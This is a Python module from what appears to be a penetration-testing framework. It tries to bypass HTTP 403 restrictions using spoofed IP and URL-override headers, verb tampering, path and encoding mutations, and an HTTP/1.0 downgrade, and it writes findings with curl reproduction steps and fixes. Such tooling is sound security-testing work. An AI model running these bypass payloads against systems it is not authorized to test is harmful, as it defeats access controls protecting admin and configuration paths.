"""403 Forbidden bypass — header manipulation, verb tampering, encoding, protocol tricks."""
from __future__ import annotations

import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

import aiohttp

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

CVSS_BYPASS = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N"

# IP/path override headers for WAF/reverse-proxy bypass
HEADER_BYPASSES: list[dict[str, str]] = [
    # IP spoofing headers (force 127.0.0.1 to bypass IP allowlist)
    {"X-Forwarded-For":         "127.0.0.1"},
    {"X-Forwarded-For":         "127.0.0.1, 127.0.0.1"},
    {"X-Real-IP":               "127.0.0.1"},
    {"X-Client-IP":             "127.0.0.1"},
    {"X-Remote-IP":             "127.0.0.1"},
    {"X-Originating-IP":        "127.0.0.1"},
    {"X-Remote-Addr":           "127.0.0.1"},
    {"True-Client-IP":          "127.0.0.1"},
    {"CF-Connecting-IP":        "127.0.0.1"},
    # Custom authorization headers
    {"X-Custom-IP-Authorization":"127.0.0.1"},
    {"X-Custom-IP-Authorization":"0.0.0.0"},
    # Proxy path override headers (override the requested URL at WAF/proxy level)
    {"X-Original-URL":          "/"},
    {"X-Rewrite-URL":           "/"},
    {"X-Override-URL":          "/"},
    # Host header variations
    {"X-Host":                  "localhost"},
    {"X-Forwarded-Host":        "localhost"},
    {"X-Forwarded-Server":      "localhost"},
    # Scheme/protocol
    {"X-Forwarded-Proto":       "https"},
    {"X-Forwarded-Scheme":      "https"},
]

HTTP_VERBS_BYPASS = [
    "POST", "PUT", "PATCH", "DELETE",
    "OPTIONS", "HEAD", "TRACE",
    "PROPFIND", "PROPPATCH",    # WebDAV verbs sometimes bypass ACLs
    "SEARCH",                    # WebDAV SEARCH
    "ARBITRARY",                 # Catch-all for unrecognised verb handling
]

PATH_MUTATIONS: list[str] = [
    # Trailing character mutations
    "{path}/",
    "{path}//",
    "{path}/.",
    "{path}/..",
    "{path}..;/",
    "{path}/.json",
    "{path}?",
    "{path}?q=1",
    "{path}#",
    # URL encoding
    "{path}%2f",          # /
    "{path}%252f",        # double-encoded /
    "{path}%20",          # space
    # Case mutations
    "{path_upper}",
    # Path prefix mutations
    "/{path_no_slash}",
    "//{path_no_slash}",
    "/;/{path_no_slash}",  # Tomcat semicolon bypass
    "/..;/{path_no_slash}",  # Spring semicolon
    # Dot-segment tricks
    "{path}/..%2f",
    "%2f{path_no_slash}",
    # Null byte / extension tricks (some WAFs)
    "{path}%00",
    "{path}%00.html",
    "{path}.html",
    "{path}.php",
]


class FourZeroThreeBypass(BaseModule):
    """403 bypass checker — tests header manipulation, verb tampering, encoding."""

    NAME        = "403_bypass"
    DESCRIPTION = "Attempt to bypass HTTP 403 Forbidden via headers, verbs, and path tricks"
    PHASE       = 6
    TAGS        = ["access-control", "403-bypass", "owasp-a01", "cwe-284"]

    async def run(self) -> ModuleResult:
        """Test configured target paths for 403 bypass vectors."""
        start  = time.monotonic()
        target = self.config.target.rstrip("/")

        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        paths: list[str] = self.config.extra.get("forbidden_paths", [
            "/admin", "/api/admin", "/config", "/.env",
            "/backup", "/server-status", "/actuator",
            "/console", "/manage", "/dashboard",
            "/api/internal", "/internal",
        ])

        connector = aiohttp.TCPConnector(ssl=False)
        timeout   = aiohttp.ClientTimeout(total=10)

        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={"Accept-Encoding": "gzip, deflate"},
        ) as session:
            for path in paths:
                url = f"{target}{path}"
                if not self.check_scope(url):
                    continue

                # Confirm base response is 403
                baseline = await self._get_response(session, "GET", url, {})
                if baseline[0] != 403:
                    continue

                self.log.debug("Found 403 on %s — testing bypass vectors", url)
                await self._test_header_bypasses(session, url, path, target)
                await self._test_verb_bypasses(session, url)
                await self._test_path_mutations(session, target, path)
                await self._test_http10_bypass(session, url)

        return self._make_result(start)

    async def _get_response(
        self,
        session: aiohttp.ClientSession,
        method: str,
        url: str,
        headers: dict[str, str],
    ) -> tuple[int, str]:
        """Return (status, body) or (-1, '') on error."""
        try:
            await self.rate_limit()
            async with session.request(
                method, url, headers=headers, allow_redirects=False
            ) as resp:
                body = await resp.text(errors="ignore")
                return resp.status, body
        except Exception:
            return -1, ""

    async def _get_status(
        self,
        session: aiohttp.ClientSession,
        method: str,
        url: str,
        headers: dict[str, str],
    ) -> int:
        status, _ = await self._get_response(session, method, url, headers)
        return status

    async def _test_header_bypasses(
        self,
        session: aiohttp.ClientSession,
        url: str,
        path: str,
        target: str,
    ) -> None:
        """Inject IP/path override headers to bypass 403."""
        # For X-Original-URL / X-Rewrite-URL, set the value to the path
        extended_bypasses = list(HEADER_BYPASSES)
        extended_bypasses.append({"X-Original-URL": path})
        extended_bypasses.append({"X-Rewrite-URL":  path})
        extended_bypasses.append({"X-Original-URL": "/"})

        for bypass_headers in extended_bypasses:
            status, body = await self._get_response(session, "GET", url, bypass_headers)
            if status in (200, 201, 204):
                ev = Evidence(
                    request_raw=(
                        f"GET {url} HTTP/1.1\n"
                        + "\n".join(f"{k}: {v}" for k, v in bypass_headers.items())
                    ),
                    response_raw=f"HTTP {status}\n{body[:300]}",
                    extra={"bypass_headers": bypass_headers, "status": status},
                )
                self.new_finding(
                    title=f"403 Bypass via Header Injection — {list(bypass_headers.keys())[0]}",
                    severity=Severity.HIGH,
                    description=(
                        f"The endpoint {url} returns HTTP 403 on a normal GET request "
                        f"but returns HTTP {status} when header {bypass_headers} is injected. "
                        "This indicates an IP/path allow-list is enforced at the proxy/WAF layer "
                        "but is bypassable via trusted-header abuse."
                    ),
                    reproduction_steps=[
                        f"curl -i {url}  # 403",
                        f"curl -i {url} " + " ".join(f"-H '{k}: {v}'" for k, v in bypass_headers.items()),
                        f"# Observe HTTP {status}",
                    ],
                    remediation=(
                        "Do not use client-supplied headers (X-Forwarded-For, "
                        "X-Real-IP, X-Original-URL) for access control decisions. "
                        "Enforce authorization at the application layer, not only at the proxy. "
                        "Use WAF rules to strip these headers from external requests."
                    ),
                    references=["CWE-284", "CWE-863", "OWASP A01:2021"],
                    evidence=ev,
                    cvss_v31_vector=CVSS_BYPASS,
                    mitre_attack=["TA0005/T1562"],
                    target=url,
                )

    async def _test_verb_bypasses(
        self,
        session: aiohttp.ClientSession,
        url: str,
    ) -> None:
        """Try alternative HTTP verbs on the 403 resource."""
        for verb in HTTP_VERBS_BYPASS:
            status, body = await self._get_response(session, verb, url, {})
            if status in (200, 201, 204):
                ev = Evidence(
                    request_raw=f"{verb} {url} HTTP/1.1",
                    response_raw=f"HTTP {status}\n{body[:200]}",
                    extra={"verb": verb, "status": status},
                )
                self.new_finding(
                    title=f"403 Bypass via HTTP Verb Tampering — {verb}",
                    severity=Severity.HIGH,
                    description=(
                        f"The endpoint {url} returns 403 on GET but HTTP {status} on {verb}. "
                        "The access control is not applied uniformly across all HTTP methods."
                    ),
                    reproduction_steps=[
                        f"curl -X GET {url}      # 403",
                        f"curl -X {verb} {url}   # {status}",
                    ],
                    remediation=(
                        "Apply authorization checks on all HTTP methods, not just GET/POST. "
                        "Use a deny-all default policy for unused HTTP verbs. "
                        "Explicitly allow only required methods (allowlisting)."
                    ),
                    references=["CWE-284", "OWASP A01:2021"],
                    evidence=ev,
                    cvss_v31_vector=CVSS_BYPASS,
                    mitre_attack=["TA0005/T1562"],
                    target=url,
                )

    async def _test_path_mutations(
        self,
        session: aiohttp.ClientSession,
        target: str,
        path: str,
    ) -> None:
        """Try URL encoding and path suffix mutations to bypass 403."""
        path_no_slash = path.lstrip("/")
        path_upper    = path.upper()

        for template in PATH_MUTATIONS:
            mutated = (
                template
                .replace("{path}",          path)
                .replace("{path_no_slash}", path_no_slash)
                .replace("{path_upper}",    path_upper)
            )
            test_url = f"{target}{mutated}" if mutated.startswith("/") else f"{target}/{mutated}"
            if not self.check_scope(test_url):
                continue
            status, body = await self._get_response(session, "GET", test_url, {})
            if status in (200, 201, 204):
                ev = Evidence(
                    request_raw=f"GET {test_url} HTTP/1.1",
                    response_raw=f"HTTP {status}\n{body[:200]}",
                    extra={"original_path": path, "mutated_path": mutated},
                )
                self.new_finding(
                    title=f"403 Bypass via Path Mutation — {mutated!r}",
                    severity=Severity.HIGH,
                    description=(
                        f"Accessing {path} returns 403, but the mutated path {mutated!r} "
                        f"returns HTTP {status}, bypassing the access control check."
                    ),
                    reproduction_steps=[
                        f"curl -i {target}{path}    # 403",
                        f"curl -i {test_url}         # {status}",
                    ],
                    remediation=(
                        "Normalize all incoming URL paths before applying access control. "
                        "Decode percent-encoding and resolve path traversal sequences. "
                        "Ensure the ACL is enforced on the canonical path, not the raw URL."
                    ),
                    references=["CWE-284", "CWE-22", "OWASP A01:2021"],
                    evidence=ev,
                    cvss_v31_vector=CVSS_BYPASS,
                    mitre_attack=["TA0005/T1562"],
                    target=test_url,
                )

    async def _test_http10_bypass(
        self,
        session: aiohttp.ClientSession,
        url: str,
    ) -> None:
        """Test HTTP/1.0 vs HTTP/1.1 protocol downgrade bypass.

        Some WAFs and reverse proxies only inspect HTTP/1.1 requests.
        Sending HTTP/1.0 may skip security checks.
        We simulate this by using a raw socket connection.
        """
        import asyncio
        import socket as _socket
        from urllib.parse import urlparse

        parsed = urlparse(url)
        host   = parsed.hostname or ""
        port   = parsed.port or (443 if parsed.scheme == "https" else 80)
        path   = parsed.path or "/"

        try:
            loop = asyncio.get_event_loop()

            def _raw_http10() -> tuple[int, str]:
                import ssl as _ssl
                sock = _socket.create_connection((host, port), timeout=5)
                if parsed.scheme == "https":
                    ctx = _ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = _ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)
                request = f"GET {path} HTTP/1.0\r\nHost: {host}\r\n\r\n"
                sock.sendall(request.encode())
                response = b""
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if len(response) > 8192:
                        break
                sock.close()
                lines   = response.decode(errors="ignore").split("\r\n")
                status  = int(lines[0].split(" ")[1]) if lines and " " in lines[0] else -1
                return status, "\r\n".join(lines[1:])[:500]

            status, body = await loop.run_in_executor(None, _raw_http10)
            if status in (200, 201, 204):
                ev = Evidence(
                    request_raw=f"GET {path} HTTP/1.0\r\nHost: {host}\r\n",
                    response_raw=f"HTTP {status}\n{body[:300]}",
                    extra={"protocol": "HTTP/1.0"},
                )
                self.new_finding(
                    title=f"403 Bypass via HTTP/1.0 Downgrade",
                    severity=Severity.HIGH,
                    description=(
                        f"The endpoint {url} returns 403 on HTTP/1.1 but HTTP {status} on HTTP/1.0. "
                        "Some reverse proxies and WAFs only apply security rules to HTTP/1.1 requests, "
                        "allowing HTTP/1.0 requests to bypass access controls."
                    ),
                    reproduction_steps=[
                        f"curl --http1.1 {url}    # 403",
                        f"curl --http1.0 {url}    # {status}",
                    ],
                    remediation=(
                        "Ensure access controls are applied regardless of HTTP protocol version. "
                        "Consider disabling HTTP/1.0 support entirely if not needed."
                    ),
                    references=["CWE-284", "OWASP A01:2021"],
                    evidence=ev,
                    cvss_v31_vector=CVSS_BYPASS,
                    target=url,
                )
        except Exception as exc:
            self.log.debug("HTTP/1.0 bypass test failed: %s", exc)


class TestFourZeroThreeBypass:
    def test_header_bypasses_non_empty(self) -> None:
        assert len(HEADER_BYPASSES) >= 10

    def test_header_bypasses_include_key_vectors(self) -> None:
        all_keys = [list(h.keys())[0] for h in HEADER_BYPASSES]
        assert "X-Original-URL" in all_keys
        assert "X-Forwarded-For" in all_keys
        assert "X-Custom-IP-Authorization" in all_keys

    def test_path_mutations_non_empty(self) -> None:
        assert len(PATH_MUTATIONS) >= 10

    def test_path_mutations_cover_encoding(self) -> None:
        all_mutations = " ".join(PATH_MUTATIONS)
        assert "%2f" in all_mutations      # URL encoding
        assert "%252f" in all_mutations    # Double encoding
        assert "..;/" in all_mutations     # Tomcat trick

    def test_verbs_include_webdav(self) -> None:
        assert "PROPFIND" in HTTP_VERBS_BYPASS
        assert "OPTIONS" in HTTP_VERBS_BYPASS

    def test_cvss_vector_format(self) -> None:
        assert CVSS_BYPASS.startswith("CVSS:3.1/")
